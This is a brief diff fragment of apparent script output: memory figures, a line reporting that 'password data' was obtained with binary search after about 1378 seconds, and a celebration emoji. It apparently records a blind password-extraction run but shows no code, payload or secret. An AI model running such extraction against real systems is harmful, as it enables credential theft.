+Memory usage:            0.055235 MB 
+Peak memory usage:       0.123534 MB
+Finished get password data with binary search:  in 1378.184363 seconds
+
+🎉
